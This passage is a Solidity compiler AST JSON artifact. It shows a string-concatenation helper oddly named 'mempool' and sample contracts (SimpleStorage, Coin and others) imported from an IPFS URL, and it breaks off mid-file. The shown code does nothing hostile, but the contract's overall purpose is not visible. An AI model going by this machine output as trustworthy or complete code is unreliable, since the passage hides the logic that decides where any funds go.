												"nodeType": "VariableDeclarationStatement",
												"src": "17168:40:3"
											},
											{
												"assignments": [
													1650
												],
												"declarations": [
													{
														"constant": false,
														"id": 1650,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17222:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1649,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17222:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1659,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1657,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1653,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1636,
																	"src": "17259:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1654,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17259:17:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1655,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1643,
																	"src": "17279:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1656,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "17279:18:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "17259:38:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1652,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "17248:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														},
														"typeName": {
															"id": 1651,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17252:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														}
													},
													"id": 1658,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17248:50:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17222:76:3"
											},
											{
												"assignments": [
													1661
												],
												"declarations": [
													{
														"constant": false,
														"id": 1661,
														"mutability": "mutable",
														"name": "_newValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17309:22:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1660,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17309:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1666,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1664,
															"name": "_tmpValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1650,
															"src": "17340:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1663,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17334:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1662,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17334:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1665,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17334:16:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17309:41:3"
											},
											{
												"assignments": [
													1668
												],
												"declarations": [
													{
														"constant": false,
														"id": 1668,
														"mutability": "mutable",
														"name": "i",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17364:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1667,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "17364:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1669,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "17364:6:3"
											},
											{
												"assignments": [
													1671
												],
												"declarations": [
													{
														"constant": false,
														"id": 1671,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17381:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1670,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "17381:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1672,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "17381:6:3"
											},
											{
												"body": {
													"id": 1693,
													"nodeType": "Block",
													"src": "17436:57:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1691,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1684,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1661,
																		"src": "17451:9:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1687,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1686,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "17461:3:3",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1685,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1671,
																			"src": "17461:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "17451:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1688,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1636,
																		"src": "17468:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1690,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1689,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1668,
																		"src": "17479:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "17468:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "17451:30:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1692,
															"nodeType": "ExpressionStatement",
															"src": "17451:30:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1680,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1677,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1668,
														"src": "17410:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1678,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1636,
															"src": "17412:10:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1679,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "17412:17:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "17410:19:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1694,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1675,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1673,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1668,
															"src": "17405:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1674,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "17407:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "17405:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1676,
													"nodeType": "ExpressionStatement",
													"src": "17405:3:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1682,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "17431:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 1681,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1668,
															"src": "17431:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1683,
													"nodeType": "ExpressionStatement",
													"src": "17431:3:3"
												},
												"nodeType": "ForStatement",
												"src": "17401:92:3"
											},
											{
												"body": {
													"id": 1715,
													"nodeType": "Block",
													"src": "17542:58:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1713,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1706,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1661,
																		"src": "17557:9:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1709,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1708,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "17567:3:3",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1707,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1671,
																			"src": "17567:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "17557:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1710,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1643,
																		"src": "17574:11:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1712,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1711,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1668,
																		"src": "17586:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "17574:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "17557:31:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1714,
															"nodeType": "ExpressionStatement",
															"src": "17557:31:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1702,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1699,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1668,
														"src": "17515:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1700,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1643,
															"src": "17517:11:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1701,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "17517:18:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "17515:20:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1716,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1697,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1695,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1668,
															"src": "17510:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1696,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "17512:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "17510:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1698,
													"nodeType": "ExpressionStatement",
													"src": "17510:3:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1704,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "17537:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 1703,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1668,
															"src": "17537:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1705,
													"nodeType": "ExpressionStatement",
													"src": "17537:3:3"
												},
												"nodeType": "ForStatement",
												"src": "17506:94:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1719,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1661,
															"src": "17627:9:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1718,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17620:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1717,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17620:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1720,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17620:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1634,
												"id": 1721,
												"nodeType": "Return",
												"src": "17613:24:3"
											}
										]
									},
									"documentation": null,
									"id": 1723,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1631,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1628,
												"mutability": "mutable",
												"name": "_base",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1723,
												"src": "17027:19:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1627,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17027:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1630,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1723,
												"src": "17048:20:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1629,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17048:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17026:43:3"
									},
									"returnParameters": {
										"id": 1634,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1633,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1723,
												"src": "17093:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1632,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "17093:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "17092:15:3"
									},
									"scope": 1724,
									"src": "17010:635:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1725,
							"src": "367:17284:3"
						}
					],
					"src": "0:17651:3"
				},
				"id": 3
			},
			"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
				"ast": {
					"absolutePath": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC",
					"exportedSymbols": {
						"C": [
							1775
						],
						"Coin": [
							1762
						],
						"E": [
							1778
						],
						"Manager": [
							1838
						],
						"OwnedToken": [
							1825
						],
						"SimpleStorage": [
							1747
						],
						"TokenCreator": [
							1866
						],
						"arrayExample": [
							1879
						]
					},
					"id": 1880,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1726,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1747,
							"linearizedBaseContracts": [
								1747
							],
							"name": "SimpleStorage",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 1728,
									"mutability": "mutable",
									"name": "storedData",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1747,
									"src": "57:15:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 1727,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "57:4:4",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1737,
										"nodeType": "Block",
										"src": "109:33:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1735,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1733,
														"name": "storedData",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1728,
														"src": "120:10:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1734,
														"name": "x",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1730,
														"src": "133:1:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "120:14:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1736,
												"nodeType": "ExpressionStatement",
												"src": "120:14:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "60fe47b1",
									"id": 1738,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "set",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1731,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1730,
												"mutability": "mutable",
												"name": "x",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1738,
												"src": "94:6:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1729,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "94:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "93:8:4"
									},
									"returnParameters": {
										"id": 1732,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "109:0:4"
									},
									"scope": 1747,
									"src": "81:61:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1745,
										"nodeType": "Block",
										"src": "192:36:4",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1743,
													"name": "storedData",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1728,
													"src": "210:10:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1742,
												"id": 1744,
												"nodeType": "Return",
												"src": "203:17:4"
											}
										]
									},
									"documentation": null,
									"functionSelector": "6d4ce63c",
									"id": 1746,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "get",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1739,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "162:2:4"
									},
									"returnParameters": {
										"id": 1742,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1741,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1746,
												"src": "186:4:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1740,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "186:4:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "185:6:4"
									},
									"scope": 1747,
									"src": "150:78:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 1880,
							"src": "27:204:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1762,
							"linearizedBaseContracts": [
								1762
							],
							"name": "Coin",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "07546172",
									"id": 1749,
									"mutability": "mutable",
									"name": "minter",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1762,
									"src": "1207:21:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 1748,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "1207:7:4",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "27e235e3",
									"id": 1753,
									"mutability": "mutable",
									"name": "balances",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1762,
									"src": "1235:41:4",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
